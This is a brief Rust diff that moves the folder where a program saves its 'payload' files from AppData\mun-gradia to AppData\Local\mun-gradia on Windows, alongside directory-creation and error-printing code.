@@ -15,7 +15,7 @@ async fn main() {
     let username = std::env::var("USERNAME").unwrap();
 
     println!("Saving payload");
-    let base_path = format!("C:\\Users\\{username}\\AppData\\mun-gradia");
+    let base_path = format!("C:\\Users\\{username}\\AppData\\Local\\mun-gradia");
     if let Err(e) = fs::create_dir_all(&base_path) {
         println!("Failed to create dirs. {e}");
     }
